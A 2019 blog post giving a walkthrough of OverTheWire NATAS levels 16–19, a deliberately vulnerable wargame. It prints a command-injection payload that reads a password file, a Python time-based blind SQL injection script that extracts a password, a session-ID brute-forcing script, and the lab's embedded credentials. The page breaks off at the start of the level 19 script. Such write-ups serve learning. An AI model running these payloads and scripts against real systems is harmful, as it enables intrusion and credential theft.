<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="OverTheWire: NATAS 16 – 20" /><meta property="og:locale" content="en" /><meta name="description" content="LEVEL 16" /><meta property="og:description" content="LEVEL 16" /><link rel="canonical" href="https://megawattsec.com/posts/overthewire-natas-16/" /><meta property="og:url" content="https://megawattsec.com/posts/overthewire-natas-16/" /><meta property="og:site_name" content="MegaWattSec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-09-13T15:22:13-04:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="OverTheWire: NATAS 16 – 20" /><meta name="twitter:site" content="@megawattsec" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2019-09-13T15:22:13-04:00","datePublished":"2019-09-13T15:22:13-04:00","description":"LEVEL 16","headline":"OverTheWire: NATAS 16 – 20","mainEntityOfPage":{"@type":"WebPage","@id":"https://megawattsec.com/posts/overthewire-natas-16/"},"url":"https://megawattsec.com/posts/overthewire-natas-16/"}</script><title>OverTheWire: NATAS 16 &#8211; 20 | MegaWattSec</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="MegaWattSec"><meta name="application-name" content="MegaWattSec"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/jamack_close.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">MegaWattSec</a></div><div class="site-subtitle font-italic">Adventures of a Forever-Newb</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/megawattsec" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/megawattsec" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['megawattsec','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>OverTheWire: NATAS 16 &#8211; 20</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>OverTheWire: NATAS 16 &#8211; 20</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/megawattsec">Dustin</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1568402533" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2019-09-13 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1786 words"> <em>9 min</em> read</span></div></div></div><div class="post-content"><h3 id="level-16"><span class="mr-2">LEVEL 16</span><a href="#level-16" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><img class="alignnone size-full wp-image-243" data-src="/assets/img/2019/09/2019-09-13_14h47_54.png" data-proofer-ignore></p><p>This level looks a lot like level 9 did with the dictionary lookup and it suggests there are now more input checks. Let’s see the source:</p><figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="nt">&lt;form&gt;</span>
Find words containing: <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">needle</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">submit</span> <span class="na">name=</span><span class="s">submit</span> <span class="na">value=</span><span class="s">Search</span><span class="nt">&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="nt">&lt;/form&gt;</span>

Output:
<span class="cp">&lt;?</span>
<span class="nv">$key</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"needle"</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
  <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"needle"</span><span class="p">];</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s2">""</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/[;|&amp;`\'"]/'</span><span class="p">,</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">print</span> <span class="s2">"Input contains an illegal character!"</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nb">passthru</span><span class="p">(</span><span class="s2">"grep -i </span><span class="se">\"</span><span class="nv">$key</span><span class="se">\"</span><span class="s2"> dictionary.txt"</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span></code></pre></figure><p>If you put the same query as level 9 <code class="language-plaintext highlighter-rouge">$(cat /etc/natas_webpass/natas17 1&gt;/proc/$$/fd/1)</code> into the Search field, it doesn’t work. However, if you put it directly into the address bar after “index.php?” it still works! It’s also pretty obvious this wasn’t the intended way to solve the challenge, but those are the most fun ways, amirite?</p><p> </p><h3 id="level-17"><span class="mr-2">LEVEL 17</span><a href="#level-17" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><img class="alignnone size-full wp-image-251" data-src="/assets/img/2019/09/2019-09-13_16h16_02.png" data-proofer-ignore></p><p>This level is a lot like level 15, however, it gives no output at all, ever! Looking at the source code shows that the output fields are just completely commented out.</p><p>The source:</p><figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?</span>

<span class="cm">/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/</span>

<span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"username"</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
  <span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="s1">'localhost'</span><span class="p">,</span> <span class="s1">'natas17'</span><span class="p">,</span> <span class="s1">'&lt;censored&gt;'</span><span class="p">);</span>
  <span class="nb">mysql_select_db</span><span class="p">(</span><span class="s1">'natas17'</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
  
  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * from users where username=</span><span class="se">\"</span><span class="s2">"</span><span class="mf">.</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]</span><span class="mf">.</span><span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="p">;</span>
  <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"debug"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"Executing query: </span><span class="nv">$query</span><span class="s2">&lt;br&gt;"</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">//echo "This user exists.&lt;br&gt;";</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="c1">//echo "This user doesn't exist.&lt;br&gt;";</span>
  <span class="p">}</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="c1">//echo "Error in query.&lt;br&gt;";</span>
  <span class="p">}</span>

  <span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$link</span><span class="p">);</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="cp">?&gt;</span>

<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"index.php"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
Username: <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"username"</span><span class="nt">&gt;&lt;br&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Check existence"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="cp">&lt;?</span> <span class="p">}</span> <span class="cp">?&gt;</span></code></pre></figure><p>That means there’s no straightforward way to extract information about the password. Situations like this is a totally blind SQL injection. Basically, we have to use some kind of side-channel information, like the time it takes to load the page. It can be tested with a SQLi query like <code class="language-plaintext highlighter-rouge">” OR IF(1=1,SLEEP(5),null)#</code> where you can see how the response takes much longer to arrive.</p><p>Rewriting the script from level 15 to measure the website’s response time as the indicator should work.</p><figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python3
#
# main execution script for solving natas17 on OverTheWire.org
# based on https://gist.github.com/Bengman/e14a4b5f1b592ee06961
</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="c1"># Get start time
</span><span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()</span>
<span class="c1"># All possible characters
</span><span class="n">allChars</span> <span class="o">=</span> <span class="s">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>
<span class="c1"># Characters used
</span><span class="n">usedChars</span> <span class="o">=</span> <span class="s">''</span>
<span class="c1"># Final Password
</span><span class="n">password</span> <span class="o">=</span> <span class="s">''</span>
<span class="c1"># Our target URL
</span><span class="n">target</span> <span class="o">=</span> <span class="s">"http://natas17.natas.labs.overthewire.org"</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
  <span class="s">'User-Agent'</span><span class="p">:</span> <span class="s">'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101'</span><span class="p">,</span>
  <span class="s">'Authorization'</span><span class="p">:</span> <span class="s">'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='</span><span class="p">,</span>
<span class="p">}</span>


<span class="k">def</span> <span class="nf">send_query</span><span class="p">(</span><span class="n">query</span><span class="p">):</span>
  <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">'username'</span><span class="p">:</span> <span class="n">query</span><span class="p">}</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"Payload: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
  <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s">'/index.php?'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">response</span>


<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
<span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="n">requests</span><span class="p">.</span><span class="n">codes</span><span class="p">.</span><span class="n">ok</span><span class="p">:</span>
  <span class="k">raise</span> <span class="nb">ValueError</span><span class="p">(</span><span class="s">'Couldn</span><span class="se">\'</span><span class="s">t connect to target :('</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
  <span class="k">print</span><span class="p">(</span><span class="s">'Target reachable. Starting character parsing...'</span><span class="p">)</span>

<span class="c1"># figure out which chars are needed
</span><span class="k">print</span><span class="p">(</span><span class="s">"Getting list of characters used..."</span><span class="p">)</span>
<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">allChars</span><span class="p">:</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"Trying Character: "</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">send_query</span><span class="p">(</span><span class="s">'natas18" and if(password LIKE BINARY "%'</span><span class="o">+</span><span class="n">c</span><span class="o">+</span><span class="s">'%", sleep(5), null)#'</span><span class="p">)</span>
  <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">Timeout</span><span class="p">:</span>
    <span class="c1"># If we got a timeout, the character exists
</span>    <span class="n">usedChars</span> <span class="o">+=</span> <span class="n">c</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Character found: "</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Characters used: "</span> <span class="o">+</span> <span class="n">usedChars</span><span class="p">)</span>

<span class="c1"># retrieve the password one char at a time
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">33</span><span class="p">):</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"Testing password..."</span><span class="p">)</span>
  <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">usedChars</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Trying Character: "</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
      <span class="n">resp</span> <span class="o">=</span> <span class="n">send_query</span><span class="p">(</span><span class="s">'natas18" and if(ascii(substring((select password from users where username="natas18"),%d,1))=%s, sleep(3), 1) #'</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)))</span>
    <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">Timeout</span><span class="p">:</span>
      <span class="n">password</span> <span class="o">+=</span> <span class="n">c</span>
      <span class="k">print</span><span class="p">(</span><span class="s">"Found character: "</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span>
      <span class="k">print</span><span class="p">(</span><span class="s">"Password so far: "</span> <span class="o">+</span> <span class="n">password</span><span class="p">)</span>
      <span class="k">break</span>

<span class="k">print</span><span class="p">(</span><span class="s">'Password: '</span> <span class="o">+</span> <span class="n">password</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"--- %s seconds ---"</span> <span class="o">%</span> <span class="p">(</span><span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span><span class="p">))</span></code></pre></figure><p> </p><h3 id="level-18"><span class="mr-2">LEVEL 18</span><a href="#level-18" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><img class="alignnone size-full wp-image-255" data-src="/assets/img/2019/09/2019-09-16_08h17_35.png" data-proofer-ignore></p><p>sourcecode:</p><figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?</span>

<span class="nv">$maxid</span> <span class="o">=</span> <span class="mi">640</span><span class="p">;</span> <span class="c1">// 640 should be enough for everyone</span>

<span class="k">function</span> <span class="n">isValidAdminLogin</span><span class="p">()</span> <span class="p">{</span> 
  <span class="k">if</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"admin"</span><span class="p">)</span> <span class="p">{</span>
  <span class="cm">/* This method of authentication appears to be unsafe and has been disabled for now. */</span>
    <span class="c1">//return 1;</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">isValidID</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span> <span class="p">{</span> 
  <span class="k">return</span> <span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">createID</span><span class="p">(</span><span class="nv">$user</span><span class="p">)</span> <span class="p">{</span> 
  <span class="k">global</span> <span class="nv">$maxid</span><span class="p">;</span>
  <span class="k">return</span> <span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nv">$maxid</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">debug</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="p">{</span> 
  <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"debug"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">print</span> <span class="s2">"DEBUG: </span><span class="nv">$msg</span><span class="s2">&lt;br&gt;"</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">my_session_start</span><span class="p">()</span> <span class="p">{</span> 
  <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"PHPSESSID"</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">)</span> <span class="k">and</span> <span class="nf">isValidID</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"PHPSESSID"</span><span class="p">]))</span> <span class="p">{</span>
  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">session_start</span><span class="p">())</span> <span class="p">{</span>
    <span class="nf">debug</span><span class="p">(</span><span class="s2">"Session start failed"</span><span class="p">);</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nf">debug</span><span class="p">(</span><span class="s2">"Session start ok"</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"admin"</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">))</span> <span class="p">{</span>
    <span class="nf">debug</span><span class="p">(</span><span class="s2">"Session was old: admin flag set"</span><span class="p">);</span>
    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"admin"</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// backwards compatible, secure</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">print_credentials</span><span class="p">()</span> <span class="p">{</span> 
  <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">and</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"admin"</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"admin"</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">print</span> <span class="s2">"You are an admin. The credentials for the next level are:&lt;br&gt;"</span><span class="p">;</span>
  <span class="k">print</span> <span class="s2">"&lt;pre&gt;Username: natas19</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
  <span class="k">print</span> <span class="s2">"Password: &lt;censored&gt;&lt;/pre&gt;"</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="k">print</span> <span class="s2">"You are logged in as a regular user. Login as an admin to retrieve credentials for natas19."</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>


<span class="nv">$showform</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="nf">my_session_start</span><span class="p">())</span> <span class="p">{</span>
  <span class="nf">print_credentials</span><span class="p">();</span>
  <span class="nv">$showform</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"username"</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"password"</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
  <span class="nb">session_id</span><span class="p">(</span><span class="nf">createID</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]));</span>
  <span class="nb">session_start</span><span class="p">();</span>
  <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"admin"</span><span class="p">]</span> <span class="o">=</span> <span class="nf">isValidAdminLogin</span><span class="p">();</span>
  <span class="nf">debug</span><span class="p">(</span><span class="s2">"New session started"</span><span class="p">);</span>
  <span class="nv">$showform</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
  <span class="nf">print_credentials</span><span class="p">();</span>
  <span class="p">}</span>
<span class="p">}</span> 

<span class="k">if</span><span class="p">(</span><span class="nv">$showform</span><span class="p">)</span> <span class="p">{</span>
<span class="cp">?&gt;</span>

<span class="nt">&lt;p&gt;</span>
Please login with your admin account to retrieve credentials for natas19.
<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"index.php"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
Username: <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"username"</span><span class="nt">&gt;&lt;br&gt;</span>
Password: <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"password"</span><span class="nt">&gt;&lt;br&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Login"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="cp">&lt;?</span> <span class="p">}</span> <span class="cp">?&gt;</span></code></pre></figure><p>This level is apparently designed to give us the password for the next level if we have a flag “admin” equal to 1. The code where “admin” is updated has been commented out, so we’re going to have to go about it another way. Notice at the top of the sourcecode is gives us a limit to the session id, 640. That suggests it’s incremental, and we can hijack an admin session by guessing the session id.</p><p>This is the code I used for the bruteforcing.</p><figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python3
# Script to brute force level 18 of natas challenges
</span>
<span class="c1"># Library to work with the POST requests
</span><span class="kn">import</span> <span class="nn">requests</span>

<span class="c1"># Good message to search for
</span><span class="n">gstr</span> <span class="o">=</span> <span class="s">"Password"</span>

<span class="c1"># Our target URL
</span><span class="n">target</span> <span class="o">=</span> <span class="s">'http://natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP@natas18.natas.labs.overthewire.org/'</span>

<span class="c1"># Check if we can connect to the target
</span><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
<span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="n">requests</span><span class="p">.</span><span class="n">codes</span><span class="p">.</span><span class="n">ok</span><span class="p">:</span>
  <span class="k">raise</span> <span class="nb">ValueError</span><span class="p">(</span><span class="s">'Couldn</span><span class="se">\'</span><span class="s">t connect to target :('</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
  <span class="k">print</span><span class="p">(</span><span class="s">'Target reachable. Starting character parsing...'</span><span class="p">)</span>

<span class="c1"># Send request with incrementing session id in a loop until we get admin
</span><span class="n">session</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span><span class="p">(</span><span class="bp">True</span><span class="p">):</span>
  <span class="n">session</span> <span class="o">+=</span> <span class="mi">1</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"Attempting Session ID: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">session</span><span class="p">))</span>
  <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Cookie'</span><span class="p">:</span> <span class="s">'PHPSESSID='</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">session</span><span class="p">)}</span>
  <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
  <span class="k">if</span> <span class="n">gstr</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Password Found!"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">break</span></code></pre></figure><p> </p><h3 id="level-19"><span class="mr-2">LEVEL 19</span><a href="#level-19" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><img class="alignnone size-full wp-image-256" data-src="/assets/img/2019/09/2019-09-16_08h37_57.png" data-proofer-ignore></p><p>This level doesn’t supply a link to it’s sourcecode, so we have to logically deduce what is going on behind the scenes. Much of the functionality should be the same as the previous level, but the text suggests there is a change to the session id.</p><p>After attempting the login, then you can see what the session id is. Try a few logins to compare different session id’s. These are the ones I got:</p><p>1) 3539392d61646d696e<br /> 2) 3633312d61646d696e<br /> 3) 3337392d61646d696e</p><p>Only the first half of the ID changes. Also, just from experience with binary data, it looks to me like hex encoded ascii. When decoded, they come out to:</p><p>1) 599-admin<br /> 2) 631-admin<br /> 3) 379-admin</p><p>The pattern is pretty clear, this level just adds “-admin” onto the incremental ID. Simply add that to the attack code from before to get the password to the next level.</p><figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python3
# Script to brute force level 19 of natas challenges
</span>
<span class="c1"># Library to work with the POST requests
</span><span class="kn">import</span> <span class="nn">requests</span>

